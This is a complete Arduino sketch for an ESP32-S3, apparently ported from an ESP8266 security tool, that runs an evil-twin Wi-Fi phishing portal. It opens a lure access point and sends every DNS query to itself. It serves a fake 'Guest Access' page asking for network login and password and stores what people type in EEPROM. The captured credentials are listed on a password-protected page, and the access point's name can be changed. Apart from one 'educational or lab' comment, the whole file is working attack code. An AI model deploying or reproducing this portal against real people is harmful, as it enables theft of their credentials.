// Captive Portal for ESP32-S3
// Ported from ESP8266 version by NoceraInfosec
// Only for educational or lab training purposes.

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>

// Password to access credentials page
const char* PASSWORD = "P@ssw0rd!";

// Default texts
#define SUBTITLE "The Internet of PAWAN!"
#define TITLE "Guest Access"
#define BODY "To connect to our network, please enter your network login. Enjoy PAWAN's superfast internet!"
#define POST_TITLE "Connecting..."
#define POST_BODY "If your access is denied, </br>please contact your supervisor. Please wait... </br></br> Thank you!"
#define PASS_TITLE "Captured Credentials"
#define CLEAR_TITLE "Cleared"

// System configurations
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Captive portal IP

// Default SSID
const char *SSID_NAME = "PAWAN 6G+ Superfast";

// State variables
String allPass = "";
String newSSID = "";
String currentSSID = "";

// EEPROM memory locations
int initialCheckLocation = 20;
int passStart = 30;
int passEnd = passStart;

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0;

DNSServer dnsServer;
WebServer webServer(80);

// -------------------- Helper Functions ----------------------

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  if (a.length() > 200) a = a.substring(0, 200);
  return a;
}

String footer() {
  return "</div><div class=q><a>&#169; 2025 PAWAN Networks. </br> All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #555555; }"
               "label { display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #7F5C57; color: #fff; font-size: 1.3em; padding: 1em; }"
               "nav b { font-size: 1.5em; display: block; margin-bottom: 0.5em; }"
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html><head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style><meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

// -------------------- Web Pages ------------------------

String index() {
  return header(TITLE) + "<div>" + BODY + "</div><div><form action=/post method=post><label>Network Login: PAWAN\\User </label>"
         "<input type=text name=u></input><label>Password:</label>"
         "<input type=password name=m></input><input type=submit value=Connect></form>" + footer();
}

String posted() {
  String username = input("u");
  String password = input("m");

  String userPassEntry = "<li><b>User:</b> " + username + "</li><li><b>Password:</b> " + password + "</li>";
  allPass += userPassEntry;

  for (int i = 0; i <= userPassEntry.length(); ++i) {
    EEPROM.write(passEnd + i, userPassEntry[i]);
  }
  passEnd += userPassEntry.length();
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass() {
  if (webServer.hasArg("password") && webServer.arg("password") == PASSWORD) {
    return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back</a></p><p><a style=\"color:blue\" href=/clear>Clear</a></p></center>" + footer();
  } else {
    return header("Protected Area!") + "<p>Authorized personnel only!</p><form action=\"/pass\" method=\"GET\"><label>Access Token:</label><input type=\"password\" name=\"password\"><input type=\"submit\" value=\"Access\"></form>" + footer();
  }
}

String ssid() {
  return header("Change SSID") + "<form action=/postSSID method=post><label>New SSID:</label>"
         "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID() {
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID.c_str());
  return newSSID;
}

String clear() {
  allPass = "";
  passEnd = passStart;
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<p>Stored passwords cleared.</p><center><a href=/>Back</a></center>" + footer();
}

// Blink LED when password is captured
void BLINK() {
  for (int counter = 0; counter < 10; counter++) {
    digitalWrite(LED_BUILTIN, counter % 2);
    delay(200);
  }
}

// -------------------- Setup ------------------------

void setup() {
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  String checkValue = "first";
  for (int i = 0; i < checkValue.length(); ++i) {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i]) {
      for (int j = 0; j < checkValue.length(); ++j) {
        EEPROM.write(j + initialCheckLocation, checkValue[j]);
      }
      EEPROM.write(0, '\0');
      EEPROM.write(passStart, '\0');
      EEPROM.commit();
      break;
    }
  }

  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }
  while (EEPROM.read(passEnd) != '\0') {
    allPass += char(EEPROM.read(passEnd));
    passEnd++;
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;
  WiFi.softAP(currentSSID.c_str());

  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid", []() { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID", []() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass", []() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
}

// -------------------- Loop ------------------------

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
